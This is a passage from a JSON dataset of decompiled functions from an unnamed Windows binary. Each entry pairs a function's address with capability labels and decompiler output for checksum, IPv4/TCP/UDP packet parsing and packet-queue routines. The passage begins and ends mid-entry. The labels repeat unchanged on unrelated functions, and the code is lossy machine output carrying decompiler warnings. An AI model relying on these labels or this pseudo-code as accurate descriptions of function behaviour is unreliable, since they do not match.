        "decompiled_code": "\nuint32_t __cdecl fcn.000478b0(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = arg_ch[9] +\n             arg_ch[8] +\n             arg_ch[7] +\n             arg_ch[6] +\n             arg_ch[5] +\n             arg_ch[4] +\n             arg_ch[3] +\n             arg_ch[2] + arg_ch[1] + *arg_ch + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h;\n    arg_ch = arg_ch + 10;\n    for (arg_10h = arg_10h + -0x14; 0x1f < arg_10h; arg_10h = arg_10h + -0x20) {\n        var_4h = arg_ch[0xf] +\n                 arg_ch[0xe] +\n                 arg_ch[0xd] +\n                 arg_ch[0xc] +\n                 arg_ch[0xb] +\n                 arg_ch[10] +\n                 arg_ch[9] +\n                 arg_ch[8] +\n                 arg_ch[7] + arg_ch[6] + arg_ch[5] + arg_ch[4] + arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 0x10;\n    }\n    for (; 7 < arg_10h; arg_10h = arg_10h + -8) {\n        var_4h = arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 4;\n    }\n    for (; 1 < arg_10h; arg_10h = arg_10h + -2) {\n        var_4h = *arg_ch + var_4h;\n        arg_ch = arg_ch + 1;\n    }\n    if (arg_10h == 1) {\n        var_4h = *arg_ch + var_4h;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 564
    },
    "00047b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00047b40(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = arg_ch[3] +\n             arg_ch[2] + arg_ch[1] + *arg_ch + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h;\n    arg_ch = arg_ch + 4;\n    for (arg_10h = arg_10h + -8; 0x1f < arg_10h; arg_10h = arg_10h + -0x20) {\n        var_4h = arg_ch[0xf] +\n                 arg_ch[0xe] +\n                 arg_ch[0xd] +\n                 arg_ch[0xc] +\n                 arg_ch[0xb] +\n                 arg_ch[10] +\n                 arg_ch[9] +\n                 arg_ch[8] +\n                 arg_ch[7] + arg_ch[6] + arg_ch[5] + arg_ch[4] + arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 0x10;\n    }\n    for (; 7 < arg_10h; arg_10h = arg_10h + -8) {\n        var_4h = arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 4;\n    }\n    for (; 1 < arg_10h; arg_10h = arg_10h + -2) {\n        var_4h = *arg_ch + var_4h;\n        arg_ch = arg_ch + 1;\n    }\n    if (arg_10h == 1) {\n        var_4h = *arg_ch + var_4h;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 520
    },
    "00047d90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00047d90(uint16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    for (; 0x1f < arg_ch; arg_ch = arg_ch + -0x20) {\n        var_4h = arg_8h[0xf] +\n                 arg_8h[0xe] +\n                 arg_8h[0xd] +\n                 arg_8h[0xc] +\n                 arg_8h[0xb] +\n                 arg_8h[10] +\n                 arg_8h[9] +\n                 arg_8h[8] +\n                 arg_8h[7] + arg_8h[6] + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h + var_4h;\n        arg_8h = arg_8h + 0x10;\n    }\n    for (; 7 < arg_ch; arg_ch = arg_ch + -8) {\n        var_4h = arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h + var_4h;\n        arg_8h = arg_8h + 4;\n    }\n    for (; 1 < arg_ch; arg_ch = arg_ch + -2) {\n        var_4h = *arg_8h + var_4h;\n        arg_8h = arg_8h + 1;\n    }\n    if (arg_ch == 1) {\n        var_4h = *arg_8h + var_4h;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 458
    },
    "00047f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_d4h\n// WARNING: Variable defined which should be unmapped: var_cch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00047f50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint var_d4h;\n    uint var_cch;\n    uint *var_c8h;\n    uint *var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b0h;\n    uint *var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h == 0) && (arg_ch == 0)) {\n        uVar3 = 0xffffffff;\n    }\n    else {\n        *0x800ce948 = arg_8h;\n        *0x800ce94c = arg_ch;\n        for (var_a4h = 0; var_a4h < 5; var_a4h = var_a4h + 1) {\n            fcn.0002c450(&var_a0h, 0x73);\n            if (0 < var_a4h) {\n                var_24h = 0;\n                var_20h = 0;\n                var_1ch = 0;\n                var_18h = 0;\n                var_14h = 0;\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                var_4h._0_1_ = 0;\n                fcn.0002c4c0(&var_24h, 0x21, 0x800545f0, var_a4h);\n                var_ach = &var_24h;\n                do {\n                    cVar2 = *var_ach;\n                    var_ach = var_ach + 1;\n                } while (cVar2 != '\\0');\n                uVar6 = var_ach - &var_24h;\n                var_c0h = &var_a4h + 3;\n                do {\n                    pcVar1 = var_c0h + 1;\n                    var_c0h = var_c0h + 1;\n                } while (*pcVar1 != '\\0');\n                puVar7 = &var_24h;\n                for (uVar5 = uVar6 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                    *var_c0h = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    var_c0h = var_c0h + 1;\n                }\n                for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                    *var_c0h = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    var_c0h = var_c0h + 1;\n                }\n            }\n            var_c8h = &var_a0h;\n            do {\n                cVar2 = *var_c8h;\n                var_c8h = var_c8h + 1;\n            } while (cVar2 != '\\0');\n            iVar4 = fcn.00074a40(var_a4h * 4 + -0x7ff32690, 0x800cb1a8, &var_a0h, var_c8h + (1 - (&var_a0h + 1)), 1);\n            if (iVar4 != 0) {\n                for (; -1 < var_a4h; var_a4h = var_a4h + -1) {\n                    fcn.00074dc0(var_a4h * 4 + -0x7ff32690, 0);\n                }\n                return 0xffffffff;\n            }\n        }\n        fcn.000344b0(0x800cd950);\n        *0x800cd960 = 0;\n        fcn.00037440(0x800cd964);\n        *0x800cd990 = 0;\n        *0x800cd994 = 0;\n        fcn.00037440(0x800cd954);\n        *0x800cd998 = 0;\n        *0x800cd984 = 0;\n        *0x800cd988 = 0;\n        fcn.0001ace0(0x800cd99c, 0x80088bc0, 0);\n        fcn.0001ace0(0x800cd9c4, 0x80088f10, *0x800cd980);\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 1146
    },
    "000481f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.000481f0(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    for (var_ch = 0; var_ch < 5; var_ch = var_ch * 4 + -0x7ff3268f) {\n        fcn.00074dc0(var_ch * 4 + -0x7ff32690, 0);\n    }\n    *0x800cd960 = 1;\n    fcn.00034570(0x800cd950);\n    fcn.00037760(0x800cd99c, 0);\n    fcn.00037710(0x800cd99c);\n    for (var_ch = 0; var_ch < 5; var_ch = var_ch + 1) {\n        iVar2 = fcn.00037730(var_ch * 8 + -0x7ff3265c);\n        if (iVar2 != 0) {\n            fcn.00037760(var_ch * 8 + -0x7ff3265c, 0);\n            fcn.00037710(var_ch * 8 + -0x7ff3265c);\n        }\n    }\n    var_4h = *0x800cd994;\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        fcn.000357f0(var_4h);\n        var_4h = puVar1;\n    }\n    var_4h = *0x800cd984;\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        fcn.000357f0(var_4h);\n        var_4h = puVar1;\n    }\n    fcn.00034540(0x800cd950);\n    return;\n}\n",
        "token_count": 447
    },
    "00048310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00048310(uint arg_8h, uint arg_ch, uint32_t *arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    ushort extraout_var;\n    ulong uVar5;\n    uint var_84h;\n    uint var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    uint var_74h;\n    uint32_t var_70h;\n    uint32_t *var_6ch;\n    uint32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint32_t *var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint32_t *var_50h;\n    char var_49h;\n    uint var_48h;\n    uint32_t *var_44h;\n    uint32_t *var_40h;\n    uint32_t *var_3ch;\n    uint var_38h;\n    int32_t var_21h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t *var_8h;\n    uint32_t *var_4h;\n    \n    puVar3 = arg_18h;\n    var_5ch = NULL;\n    var_40h = NULL;\n    var_10h = 0;\n    var_58h = 0;\n    var_8h = NULL;\n    var_3ch = NULL;\n    var_4h = NULL;\n    var_44h = NULL;\n    var_54h = 0;\n    var_50h = NULL;\n    var_70h = 0;\n    var_21h._0_1_ = 2;\n    stack0xffffffdc = 0;\n    if (arg_10h == NULL) {\n        var_5ch = arg_18h;\n        var_10h = arg_1ch;\n        if (arg_1ch < 0xe) goto code_r0x0004886b;\n        var_6ch = arg_18h;\n        arg_18h = arg_18h + 0xe;\n        var_10h = arg_1ch - 0xe;\n    }\n    else {\n        if (arg_14h != 0xe) goto code_r0x0004886b;\n        var_6ch = arg_10h;\n        var_10h = arg_1ch;\n    }\n    var_5ch = puVar3;\n    iVar2 = fcn.00035980(arg_18h & 0xffff0000 | *(var_6ch + 3));\n    if (iVar2 == 0x800) {\n        if (0x13 < var_10h) {\n            var_8h = arg_18h;\n            var_ch = fcn.00035980(CONCAT22(extraout_var, *(arg_18h + 2)));\n            var_ch = var_ch & 0xffff;\n            var_68h = (*var_8h & 0xf) << 2;\n            if ((0x13 < var_68h) && (var_68h <= var_ch)) {\n                var_48h._0_2_ = fcn.000477b0(var_8h, var_68h);\n                if (var_48h == 0) {\n                    uVar4 = var_48h;\n                    if (arg_20h == 0) {\n                        if (((0x2d < var_ch) && (var_ch != var_10h)) || ((var_ch < 0x2e && (var_10h < var_ch))))\n                        goto code_r0x0004886b;\n                        uVar4 = var_10h;\n                        if (var_10h != var_ch) {\n                            var_10h = var_ch;\n                        }\n                    }\n                    var_64h._0_2_ = fcn.00035980(uVar4 & 0xffff0000 | *(var_8h + 6));\n                    var_49h = (var_64h & 0x2000) >> 0xd;\n                    var_64h._0_2_ = var_64h & 0x1fff;\n                    if ((var_64h == 0) && (var_49h == '\\0')) {\n                        puVar3 = arg_18h + var_68h;\n                        var_10h = var_10h - var_68h;\n                        uVar1 = *(var_8h + 9);\n                        arg_18h = puVar3;\n                        if (uVar1 == 1) {\n                            if ((3 < var_10h) &&\n                               ((var_44h = puVar3,  arg_20h != 0 ||\n                                (var_48h._0_2_ = fcn.00047d90(puVar3, var_10h),  var_48h == 0)))) {\n                                arg_18h = puVar3 + 1;\n                                var_10h = var_10h - 4;\n                                if (0x1a < var_10h) {\n                                    var_50h = arg_18h;\n                                    var_54h = fcn.00035950(*arg_18h);\n                                    arg_18h = puVar3 + 2;\n                                    var_10h = var_10h - 4;\n                                    *NULL = fcn.0004c260(arg_18h, 0x16);\n                                    if (*NULL == 0) {\n                                        if ((0x1a < var_10h) &&\n                                           (var_50h = arg_18h,  var_54h = fcn.00035950(*arg_18h), \n                                           (var_54h & 0x80000000) != 0)) {\n                                            arg_18h = puVar3 + 3;\n                                            var_10h = var_10h - 4;\n                                            *NULL = fcn.0004c260(arg_18h, 0x16);\n                                            if ((*NULL != 0) &&\n                                               (var_21h._0_1_ =\n                                                     -((var_54h & 0x40000000) != 0) & 2U | 1 |\n                                                     -((var_54h & 0x20000000) != 0) & 4U | 8,  arg_20h == 0)) {\n                                                var_70h = var_50h[-1];\n                                                var_50h[-1] = 0;\n                                            }\n                                        }\n                                    }\n                                    else if ((var_54h & 0x80000000) != 0) {\n                                        var_21h._0_1_ =\n                                             -((var_54h & 0x40000000) != 0) & 2U | 1 |\n                                             -((var_54h & 0x20000000) != 0) & 4U;\n                                    }\n                                }\n                            }\n                        }\n                        else if (uVar1 == 6) {\n                            if (0x13 < var_10h) {\n                                var_68h = ((*(puVar3 + 3) & 0xf0) >> 4) << 2;\n                                var_3ch = puVar3;\n                                if (arg_20h == 0) {\n                                    var_7ch = var_8h[3];\n                                    var_78h = var_8h[4];\n                                    var_74h._0_1_ = 0;\n                                    var_74h._1_1_ = *(var_8h + 9);\n                                    var_74h._2_2_ = fcn.00035980(var_78h & 0xffff0000 | var_10h & 0xffff);\n                                    var_48h._0_2_ = fcn.000478b0(&var_7ch, var_3ch, var_10h);\n                                    if (var_48h != 0) goto code_r0x0004886b;\n                                }\n                                arg_18h = puVar3 + var_68h;\n                                var_10h = var_10h - var_68h;\n                                if (((*(var_3ch + 0xd) & 0xef) != 0) && (0x16 < var_10h)) {\n                                    *NULL = fcn.0004c260(arg_18h, 0x16);\n                                }\n                            }\n                        }\n                        else if (uVar1 == 0x11) {\n                            if (7 < var_10h) {\n                                var_4h = puVar3;\n                                if (arg_20h == 0) {\n                                    var_1ch = var_8h[3];\n                                    var_18h = var_8h[4];\n                                    var_14h._0_1_ = 0;\n                                    var_14h._1_1_ = *(var_8h + 9);\n                                    var_14h._2_2_ = *(puVar3 + 1);\n                                    if (*(puVar3 + 6) == 0) {\n                                        var_48h._0_2_ = 0;\n                                    }\n                                    else {\n                                        uVar4 = fcn.00035980(puVar3 & 0xffff0000 | *(puVar3 + 1));\n                                        var_48h._0_2_ = fcn.00047b40(&var_1ch, var_4h, uVar4 & 0xffff);\n                                    }\n                                    if (var_48h != 0) goto code_r0x0004886b;\n                                }\n                                arg_18h = puVar3 + 2;\n                                var_10h = var_10h - 8;\n                                uVar5 = CONCAT44(var_10h, stack0xffffffdc);\n                                if (0x16 < var_10h) {\n                                    uVar5 = fcn.0004c260(arg_18h, 0x16);\n                                    *NULL = uVar5;\n                                    if (*NULL != 0) goto code_r0x0004886b;\n                                }\n                                stack0xffffffdc = uVar5;\n                                iVar2 = fcn.00035980(uVar5 >> 0x20 & 0xffff0000 | *(var_4h + 2));\n                                if ((((iVar2 == 0x35) &&\n                                     (*NULL = fcn.00049a80(arg_18h, var_10h, &var_21h, &var_38h, &var_58h, &var_54h), \n                                     *NULL != 0)) && (var_40h = &var_38h,  (var_21h & 1) != 0)) && (arg_20h == 0)) {\n                                    var_70h = *arg_18h;\n                                    *arg_18h = var_54h;\n                                    var_10h = var_10h - 4;\n                                    arg_18h = puVar3 + 3;\n                                }\n                            }\n                        }\n                        else if (0x16 < var_10h) {\n                            *NULL = fcn.0004c260(puVar3, 0x16);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    else if (0x16 < var_10h) {\n        *NULL = fcn.0004c260(arg_18h, 0x16);\n    }\ncode_r0x0004886b:\n    if ((stack0xffffffdc != 0) && (arg_20h == 0)) {\n        if ((var_21h & 0x40) == 0) {\n            if (var_8h != NULL) {\n                *(var_8h + 2) = 0;\n                *(var_8h + 1) = 0;\n                *(var_8h + 6) = 0;\n                *(var_8h + 2) = 0;\n                *(var_8h + 10) = 0;\n            }\n            if (var_3ch != NULL) {\n                var_3ch[2] = 0;\n                var_3ch[1] = 0;\n                *(var_3ch + 4) = 0;\n                *(var_3ch + 3) = 0;\n                *(var_3ch + 0xd) = 0;\n                *(var_3ch + 0xe) = 0;\n                *(var_3ch + 0x12) = 0;\n            }\n            if (var_4h != NULL) {\n                *(var_4h + 6) = 0;\n                *(var_4h + 1) = 0;\n            }\n            if (((var_44h != NULL) && (*(var_44h + 2) = 0,  (var_21h & 1) != 0)) && (var_50h != NULL)) {\n                uVar4 = fcn.00035950(var_54h & 0x9fffffff);\n                *var_50h = uVar4;\n            }\n        }\n        var_68h = arg_1ch - var_10h;\n        if ((stack0xffffffdc < 1) || (4 < stack0xffffffdc)) {\n            if (stack0xffffffdc == 10) {\n                var_60h = 4;\n            }\n            else {\n                var_60h = 0;\n            }\n        }\n        else {\n            arg_18h = arg_18h + 0x16;\n            var_10h = var_10h - 0x16;\n            var_60h = stack0xffffffdc + -1;\n        }\n        if (var_40h == NULL) {\n            var_40h = arg_18h;\n            var_58h = var_10h;\n            arg_18h = NULL;\n            var_10h = 0;\n        }\n        fcn.00048a20(arg_8h, arg_ch, arg_10h, arg_14h, var_5ch, var_68h, var_40h, var_58h, var_60h, \n                     var_10h & 0xffffff00 | var_21h, var_70h, arg_18h, var_10h);\n    }\n    if ((stack0xffffffdc == 0) || ((var_21h & 0x40) != 0)) {\n        var_84h = 1;\n    }\n    else {\n        var_84h = 0;\n    }\n    return var_84h;\n}\n",
        "token_count": 3287
    },
    "00048a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00048a20(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h\n            , int32_t arg_24h, int32_t arg_28h, uint arg_2ch, int32_t arg_30h, uint arg_34h, int32_t arg_38h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x800cd960 == 0) && (piVar2 = fcn.000356f0(arg_14h + 0x34 + arg_1ch + arg_24h + arg_38h),  piVar2 != NULL)) {\n        fcn.00078bfa(piVar2, 0, 0x34);\n        fcn.00078be8(piVar2 + 0xd, arg_10h, arg_14h);\n        fcn.00078be8(piVar2 + arg_14h + 0x34, arg_18h, arg_1ch);\n        fcn.00078be8(piVar2 + arg_1ch + arg_14h + 0x34, arg_20h, arg_24h);\n        fcn.00078be8(piVar2 + arg_24h + arg_1ch + arg_14h + 0x34, arg_34h, arg_38h);\n        piVar2[1] = arg_8h;\n        piVar2[2] = arg_ch;\n        piVar2[3] = piVar2 + 0xd;\n        piVar2[4] = arg_14h + arg_1ch;\n        piVar2[5] = piVar2 + arg_1ch + arg_14h + 0x34;\n        piVar2[6] = arg_24h;\n        piVar2[7] = arg_28h;\n        *(piVar2 + 8) = arg_2ch;\n        piVar2[10] = arg_30h;\n        piVar2[0xb] = piVar2 + arg_24h + arg_1ch + arg_14h + 0x34;\n        piVar2[0xc] = arg_38h;\n        fcn.00037640(0x800cd964, &var_4h, 1);\n        piVar1 = piVar2;\n        if (*0x800cd990 != NULL) {\n            **0x800cd990 = piVar2;\n            piVar1 = *0x800cd994;\n        }\n        *0x800cd994 = piVar1;\n        *0x800cd990 = piVar2;\n        fcn.00037670(0x800cd964, &var_4h, 1);\n        fcn.00034570(0x800cd950);\n    }\n    return;\n}\n",
        "token_count": 677
    },
    "00048bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Variable defined which should be unmapped: var_e4h\n// WARNING: Variable defined which should be unmapped: var_e0h\n\nuint fcn.00048bc0(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    while (fcn.000345a0(0x800cd950, 0xffffffff),  *0x800cd960 == 0) {\n        while( true ) {\n            fcn.00037640(0x800cd964, &fcn.00048bc0::var_8h, 1);\n            var_4h = *0x800cd994;\n            if ((*0x800cd994 != NULL) && (*0x800cd994 = **0x800cd994,  *0x800cd994 == NULL)) {\n                *0x800cd990 = 0;\n            }\n            piVar4 = 0x48c2f;\n            fcn.00037670(0x800cd964, &fcn.00048bc0::var_8h, 1);\n            if (var_4h == NULL) break;\n            if ((*(var_4h + 8) & 0x20) != 0) {\n                piVar4 = var_4h;\n                fcn.00049b40(var_4h);\n            }\n            if ((((*(var_4h + 8) & 1) == 0) || ((*(var_4h + 8) & 2) != 0)) && (var_4h[4] < 0x81)) {\n                fcn.00078be8(&fcn.00048bc0::var_e0h, var_4h[3], var_4h[4], piVar4);\n                fcn.00078bfa(&fcn.00048bc0::var_e0h + var_4h[4], 0, 0x80 - var_4h[4]);\n                var_60h = var_4h[4];\n                var_5ch = *(var_4h + 8) & 9 | 2;\n                if (var_4h[1] == 0) {\n                    var_54h = var_4h[2];\n                }\n                else {\n                    var_54h = var_4h[1];\n                }\n                var_58h = var_4h[1] == 0;\n                iVar2 = fcn.00075640(*(var_4h[7] * 4 + -0x7ff32690), var_4h[5], var_4h[6], &fcn.00048bc0::var_e0h, 0);\n                if ((iVar2 == 0) && (iVar2 = fcn.00037730(var_4h[7] * 8 + -0x7ff3265c),  iVar2 == 0)) {\n                    fcn.0001ace0(var_4h[7] * 8 + -0x7ff3265c, 0x80088f10, *(var_4h[7] * 4 + -0x7ff32690));\n                }\n            }\n            if ((*(var_4h + 8) & 1) != 0) {\n                if (((*(var_4h + 8) & 4) == 0) || (iVar2 = fcn.000498c0(var_4h),  iVar2 == 0)) {\n                    *(var_4h + 8) = *(var_4h + 8) & 0xf9;\n                    uVar3 = fcn.00078a6e();\n                    var_4h[6] = uVar3 % 0x20 + 0x21;\n                    if (((*(var_4h + 8) & 0x10) != 0) && (3 < var_4h[6])) {\n                        var_4h[6] = 3;\n                    }\n                    for (var_ch = 0; var_ch < var_4h[6]; var_ch = var_ch + 1) {\n                        uVar1 = fcn.00078a6e();\n                        *(&fcn.00048bc0::var_50h + var_ch) = uVar1;\n                    }\n                    var_4h[5] = &fcn.00048bc0::var_50h;\n                    fcn.00049030(var_4h);\n                }\n                else {\n                    var_4h[5] = *(iVar2 + 0x14);\n                    var_4h[6] = *(iVar2 + 0x18);\n                    *(var_4h + 8) = *(var_4h + 8) & 0xfb | 2;\n                    fcn.00049030(var_4h);\n                    fcn.000357f0(iVar2);\n                }\n            }\n            fcn.000357f0(var_4h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1217
    },
    "00048eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00048eb0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00037800(&var_ch);\n    if (iVar1 != 0) {\n        for (var_4h = 0; var_4h < 5; var_4h = var_4h + 1) {\n            if ((*(var_4h * 8 + -0x7ff32658) != 0) && (*(var_4h * 8 + -0x7ff32658) == var_8h)) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 166
    },
    "00048f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dch\n// WARNING: Variable defined which should be unmapped: var_d8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00048f10(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint8_t var_39h;\n    uint var_38h;\n    uint *var_4h;\n    \n    var_dch = arg_8h;\n    var_4h = &var_38h;\n    while( true ) {\n        fcn.00078bfa(&var_d0h, 0, 0x90);\n        if (*0x800cd960 != 0) break;\n        iVar1 = fcn.00075850(var_dch, &var_d4h, &var_40h, &var_d0h, 0xffffffff, 0);\n        if (iVar1 == 0) {\n            var_39h = var_4ch;\n            fcn.00078bfa(var_4h, 0, 0x34);\n            if (var_48h == 0) {\n                var_4h[1] = var_44h;\n            }\n            else {\n                var_4h[2] = var_44h;\n            }\n            var_4h[4] = var_50h;\n            var_4h[3] = &var_d0h;\n            var_4h[5] = var_d4h;\n            var_4h[6] = var_40h;\n            *(var_4h + 8) = var_39h;\n            if ((var_39h & 1) == 0) {\n                fcn.00049030(var_4h);\n            }\n            else {\n                fcn.000496b0(var_4h);\n            }\n            fcn.000752c0(var_dch, var_d4h);\n        }\n        else {\n            var_dch = 10000;\n            fcn.00043cb0(10000);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 521
    },
    "00049030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Switch with 1 destination removed at 0x0004946a\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00049030(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t arg_ch;\n    uint uVar6;\n    ushort extraout_var;\n    uint *puVar7;\n    uint *arg_8h_00;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint *var_44h;\n    int32_t var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint8_t *var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    if ((*(arg_8h + 0x20) & 0x10) == 0) {\n        if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3d) {\n            var_58h = 0x3c;\n        }\n        else {\n            var_58h = *(arg_8h + 0x10) + *(arg_8h + 0x18);\n        }\n        var_38h = fcn.000356f0(var_58h);\n        if (var_38h == NULL) {\n            return;\n        }\n    }\n    else {\n        *(arg_8h + 